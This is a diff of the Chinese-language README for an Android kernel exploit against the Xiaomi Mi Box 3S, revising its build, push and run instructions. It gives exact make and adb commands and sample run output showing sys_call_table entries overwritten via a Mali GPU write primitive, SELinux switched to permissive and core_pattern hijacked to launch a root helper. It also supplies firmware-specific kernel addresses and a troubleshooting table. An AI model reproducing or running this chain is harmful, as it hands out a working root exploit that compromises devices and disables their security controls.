@@ -347,26 +347,98 @@ kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
 
 ## 8. 编译与运行
 
-```sh
-# 小米盒子 3S 目标：aarch64 helper（gpwrite 绕开了坏掉的 /dev/ion mmap）
-make                     # gpwrite64、kfunc_new、kread、crash_for_core
-# 或者用 zig 当交叉编译器：
-make zig
-# 上游的 32 位 helper，供 MiTV4 / 对照使用：
-make gpu_arb_write gpu_scan
+### 8.1 前置条件
 
+- `adb` 已连上盒子（`adb devices` 能看到）。下面全部以普通 `adb shell`（uid 2000）执行，
+  **root 是结果，不是前提**。
+- 一套交叉工具链：`aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`，**或者**用
+  [zig](https://ziglang.org)（`make zig` 不需要 sysroot，也不用装 gcc）。
+- 设备上不需要任何额外东西：helper 都是静态链接，用 `/system/bin/sh` 跑。
+
+### 8.2 编译
+
+```sh
+make                          # 小米盒子 3S 那条链：gpwrite64 kfunc_new kread crash_for_core
+make zig                      # 同上，用 zig 当交叉编译器
+make gpu_arb_write gpu_scan   # 上游的 32 位 helper（MiTV4 路径 / 对照用）
+```
+
+`kfunc_new` **必须**是 aarch64：32 位调用者会被派发到 `.text` 里的
+`compat_sys_call_table`，永远打不到本利用要改的那张表（§5.2）。`gpwrite64` 同理——
+写本身与位宽无关，但它在里面做的探测不是。
+
+### 8.3 推送
+
+```sh
+make install
+```
+
+或者手动：
+
+```sh
 adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
-adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh && ./run.sh'
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh'
 ```
 
-如果固件不同，`run.sh` 支持两个覆盖变量：
+### 8.4 先验证写原语，再碰系统调用表
 
 ```sh
-KLN_ADDR=ffffffc00...   # 你的内核里 kallsyms_lookup_name 的地址
-SLOT_PHYS=1ee77a0       # sys_call_table[244] 的物理地址（小米盒子 3S 8.2.2.817）
+adb shell /data/local/tmp/gpwrite64 place 0
+# [*] test page phys=0x47e5d000 +0x0
+# [*] changed [0x0..0x7f] count=128 PLACEMENT OK
 ```
 
-在陌生固件上恢复这两个值，是本 PoC 唯一没有自动化的部分，见第 10 节。
+`PLACEMENT OK` 表示一次 128 字节的 GPU 写确实落在了 `pagemap` 报的那个物理页上。
+出现 `MISMATCH` 或 `count=0` 就停下来——写原语没通，后面每一步都会变成往内核内存里
+写垃圾（§4）。
+
+### 8.5 运行
+
+```sh
+adb shell /data/local/tmp/run.sh
+```
+
+```
+[run] stage 0: sys_call_table[244..259] <- kallsyms_lookup_name
+[run] memcpy            = 0xffffffc0013e1270
+[run] selinux_enforcing = 0xffffffc0020cff24
+[run] core_pattern      = 0xffffffc001f1c0c8
+[run] stage 2: sys_call_table[244..259] <- memcpy
+[run] stage 3: selinux_enforcing = 0
+[run] getenforce -> Permissive
+[run] stage 4: core_pattern <- |/data/local/tmp/roothelper.sh
+[run] stage 5: triggering coredump
+[run] success - helper ran as root:
+    uid=0(root) gid=0(root) ... context=u:r:kernel:s0
+```
+
+`roothelper.sh` 会把自身输出写到 `/data/local/tmp/root.log`；如果
+`/data/local/tmp/su` 存在，还会把它装成 setuid 的 `su`（§7）。
+
+### 8.6 换成别的固件
+
+只有两个常量与构建相关，其余全部在运行期解析：
+
+```sh
+KLN_ADDR=ffffffc00111e5a0 SLOT_PHYS=1eaf7a0 adb shell /data/local/tmp/run.sh
+```
+
+| 构建 | `SLOT_PHYS` | `KLN_ADDR` |
+|---|---|---|
+| `8.2.2.817`（`run.sh` 的默认值） | `1ee77a0` | `ffffffc00111e5d0` |
+| `6.8.22.145` | `1eaf7a0` | `ffffffc00111e5a0` |
+
+在陌生构建上恢复这两个值——包括完全没有 root 的情况——见 §10 与
+[FINDING_ADDRESSES.md](FINDING_ADDRESSES.md)。
+
+### 8.7 失败时看这里
+
+| 现象 | 原因 |
+|---|---|
+| `place` 打印 `MISMATCH` 或 `count=0` | 写没落地：`/dev/mali` 必须是 `0666`，且本单元要用 §4.1 的 `pixel_format` |
+| `cannot resolve memcpy (slot wrong?)` | `SLOT_PHYS` 不是本构建的 `sys_call_table[244]` |
+| 直接重启 / 黑屏 | 内核 oops，本机 `panic_on_oops=1`。地址错会**直接 fault**，不会温和失败——务必先离线确认（§10） |
+| `gpwrite64 missing (build: make gpwrite64)` | 推送后没 `chmod 755`，或者二进制架构不对 |
 
 ---
 
